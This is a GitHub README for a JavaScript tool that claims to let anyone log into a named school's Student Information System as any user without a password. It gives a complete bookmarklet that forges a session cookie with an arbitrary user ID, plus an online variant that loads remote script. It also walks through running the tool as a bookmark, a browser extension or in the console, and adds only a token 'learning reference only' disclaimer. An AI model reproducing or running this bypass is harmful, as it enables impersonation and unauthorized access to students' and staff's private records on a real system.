# XueWu System

***Zhuang ShengLi Database Presented***

A system written in Javascript that allows users to log in into Student Information System with any identity without password.

## Running It

There are 3 ways to run the script

1. Running using `javascipt:` URL
   
   1. Copy the following URL:
      
      - Offline Edition
        
        ```javascript
        javascript:(function(){console.log("Hello from XueWu System Core Javascript. (C)opyright 2024 KCISHackers. All Rights reserved. Visit: https://www.github.com/KCISHacker/XueWuSystem for more info.");if(document.getElementById("tweaked")){alert('This page had already been tweaked! Do not run twice!');return;}function tweak(id){document.cookie="DSAI="+id+";path=/";fetch(window.location.origin+'/DSAI/Query/Form_ListDetention?strKeyWord1=').then(response=>response.json()).catch(error=>(function(){console.error(error);if(error.name=='SyntaxError'){alert(id+' seems not exist. Check your spelling.');return;}alert("Error while tweaking "+id+"! "+error);successed=false;}()));}function btn_onclick(){if(document.getElementById("UserId").value==''){alert('Username field cannot be empty!');return;}tweak(document.getElementById("UserId").value);window.location.href="/DSAI/Home";}document.getElementsByName('btn_s')[0].addEventListener("click",function(){btn_onclick();});document.getElementsByClassName("main_logout")[0].innerText="tweaked by 学武系统tweaker";document.getElementsByClassName("ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset")[1].innerHTML="<div style=\"color:red\">This program is for learning reference only, rather than abusing, or you'll take the risk!</div>";document.getElementById("UserId").addEventListener("keyup",function(event){if(event.keyCode===13){event.preventDefault();btn_onclick();}});var mark=document.createElement('div');mark.id='tweaked';document.body.appendChild(mark);}())
        ```
      
      - Online Edition (Need to access to github.io, but shorter)
        
        ```javascript
        javascript:(function(){var s=document.createElement('script'),ss='https://kcishacker.github.io/res/XueWu.js';s.src=ss;document.body.appendChild(s);}())
        ```
   
   2. Visit this URL while you are in [Student Information System Log In Page](https://portal.kcisec.com/China/Account/LogIn). The Javascript should inject correctly. **If you are using Safari, skip this step.**
   
   3. You can save this URL as a bookmark and use it anytime.

2. Installing as a browser extension **(may not work for Safari or FireFox)**:
   
   1. Go to [Extension Setting](about://extensions) page in your brower .
   
   2. Enable `Developer Mode` (It should appear somewhere on the page).
   
   3. After enabling this options, you should see a `Load Unpackaged` button on the page.
   
   4. Click it and specify the path of the folder `Chrome Extension` contained in the Git repository.
   
   5. It is now installed on your brower. Do not move, rename, or delete the `Chrome Extension` folder after installation.

3. Running the script manually:
   
   1. Open the JavaScript file named "core.js" from the Git repository.
   2. The file contains comments explaining the purpose of each function.
   3. Try running the functions in the [Developer Tools](https://en.wikipedia.org/wiki/Web_development_tools) Console of your browser while on the [Student Information System Log In Page](https://portal.kcisec.com/China/Account/LogIn).

:) Enjoy

## License

MIT License

Copyright (c) 2024 KCISHackers

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
